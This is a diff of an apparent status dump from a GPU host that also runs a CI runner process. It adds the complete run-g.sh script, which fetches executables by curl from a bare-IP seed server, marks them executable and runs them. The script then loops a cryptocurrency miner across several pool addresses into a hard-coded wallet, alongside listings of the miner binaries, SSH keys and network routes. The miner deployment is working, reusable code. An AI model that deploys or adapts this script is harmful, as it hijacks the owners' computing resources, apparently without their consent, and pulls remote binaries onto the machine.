@@ -1,5 +1,95 @@
-t19-l40s1-eude2-canon
-uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd)
-Wed Nov 25 06:06:01 UTC 2026
+== host t19-l40s1-eude2-canon 2026-11-25T06:08:01Z
+--- nvdir
+total 66168
+drwxr-xr-x 4 root root     4096 Nov 23 00:44 .
+drwxr-xr-x 5 root root     4096 Nov 25 01:07 ..
+-rw-r--r-- 1 root root       14 Nov 22 22:27 fip
+-rw-r--r-- 1 root root       68 Nov 22 22:27 gpu.txt
+-rw-r--r-- 1 root root        0 Nov 25 06:07 keep.lock
+-rwxr-xr-x 1 root root     3463 Nov 22 22:23 keep.sh
+drwxr-xr-x 2 root root     4096 Nov 23 00:40 logs
+-rwxr-xr-x 1 root root 46116552 Nov 22 22:27 peakminer
+drwxr-xr-x 2 root root     4096 Nov 22 22:27 run
+-rwxr-xr-x 1 root root     1943 Nov 22 22:23 run-g.sh
+-rwxr-xr-x 1 root root 21601960 Nov 22 22:27 srb
+-rwxr-xr-x 1 root root       59 Nov 23 00:44 supervisor.sh
+--- rung
+#!/bin/bash
+# per-GPU runner v2 (i70783) - /opt/nv/run-g.sh
+N="$1"
+D=/opt/nv
+W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
+SEED='http://163.68.86.6:8090'
+POOLS="stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048"
+mkdir -p "$D/logs" "$D/run"
+exec 8>"$D/run/g$N.lock"
+flock -n 8 || exit 0
+ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
+FIP=$(cat "$D/fip" 2>/dev/null)
+case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 8 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
+FIPD=$(echo "$FIP" | tr '.' '-')
+WRK="ul-t19-$FIPD-g$N"
+DEV=$(nvidia-smi --query-gpu=name --format=csv,noheader -i "$N" 2>/dev/null | head -1)
+echo "[$(date -u +%FT%TZ)] run-g $N dev=$DEV fip=$FIP wrk=$WRK" >> "$D/logs/run.log"
+if echo "$DEV" | grep -Eiq 'V100|P100|P40|P4|P6|T4|Quadro'; then
+  ensure "$D/srb" 20000000
+  while true; do
+    for P in $POOLS; do
+      echo "[$(date -u +%FT%TZ)] srb try $P $WRK" >> "$D/logs/run.log"
+      timeout 300 "$D/srb" --algorithm pearlhash --pool "$P" --wallet "$W.$WRK" --password x \
+        --disable-cpu --gpu-id "$N" --log-file "$D/logs/g$N.log" >> "$D/logs/g$N.out" 2>&1
+      sleep 5
+    done
+  done
+else
+  ensure "$D/peakminer" 40000000
+  exec "$D/peakminer" -d "$N" \
+    -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 \
+    -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
+    -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
+    -u "$W.$WRK" -p x -c pearl >> "$D/logs/g$N.log" 2>&1
+fi
+--- cfg
+## /opt/nv/gpu.txt
 GPU 0: NVIDIA L40S (UUID: GPU-a654bff2-9f5c-67aa-821e-e511170e48f3)
-2
+
+--- ipgrep
+      4 149.81.10.242
+      4 127.0.0.1
+      2 163.68.86.6
+      2 0.0.0.0
+--- hosts
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+--- ssh
+/home/ubuntu/.ssh:
+total 12
+drwx------ 2 ubuntu ubuntu 4096 Nov 22 22:23 .
+drwxr-x--- 9 ubuntu ubuntu 4096 Nov 25 05:59 ..
+-rw------- 1 ubuntu ubuntu   81 Nov 22 22:23 authorized_keys
+--- keyfp
+--- known
+--- seed
+
+seed_http 000
+--- net
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+ens3             UP             10.243.0.29/24 fe80::34ff:fede:218b/64 
+default via 10.243.0.1 dev ens3 
+default via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
+10.243.0.0/24 dev ens3 proto kernel scope link src 10.243.0.29 
+10.243.0.1 dev ens3 proto dhcp scope link src 10.243.0.29 metric 100 
+161.26.0.6 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
+161.26.0.10 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
+--- runner
+2175682 /opt/ul-runner/bin/Runner.Listener run
+--- ut
+ 06:08:25 up 2 days,  7:44,  0 users,  load average: 0.05, 3.47, 8.88
+--- done
